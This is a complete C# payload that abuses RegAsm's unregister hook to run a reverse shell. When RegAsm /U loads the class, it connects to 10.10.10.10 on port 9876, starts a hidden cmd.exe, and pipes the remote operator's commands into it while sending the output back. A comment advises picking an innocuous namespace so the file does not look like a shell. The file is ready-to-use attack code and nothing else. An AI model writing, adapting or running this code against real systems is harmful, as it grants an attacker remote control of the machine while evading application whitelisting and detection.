using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AlphaSkillsPayload  // (Use a benign namespace/name, avoid "RShell" etc.)
{
    [ComVisible(true)]
    public class Payload
    {
        // This method will be called by RegAsm /U
        [ComUnregisterFunction]
        public static void UnregisterFunction(Type t)
        {
            try
            {
                // 1. Connect to attacker (reverse shell endpoint)
                TcpClient client = new TcpClient("10.10.10.10", 9876);
                NetworkStream stream = client.GetStream();
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream);

                // 2. Launch hidden CMD process
                Process proc = new Process();
                proc.StartInfo.FileName = Environment.GetEnvironmentVariable("ComSpec"); // path to cmd.exe
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardInput = true;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                // When CMD produces output, send it over the socket
                proc.OutputDataReceived += (sender, args) =>
                {
                    if (!string.IsNullOrEmpty(args.Data))
                    {
                        writer.WriteLine(args.Data);
                        writer.Flush();
                    }
                };
                proc.Start();
                proc.BeginOutputReadLine();  // begin asynchronous read of stdout

                // 3. Read commands from attacker and feed into CMD
                string command;
                while ((command = reader.ReadLine()) != null)
                {
                    proc.StandardInput.WriteLine(command);
                }

                // If the loop exits, either the connection or process ended.
            }
            catch (Exception ex)
            {
                // Handle exceptions (optional: you can log or suppress errors to avoid noisy failures)
            }
        }
    }
}
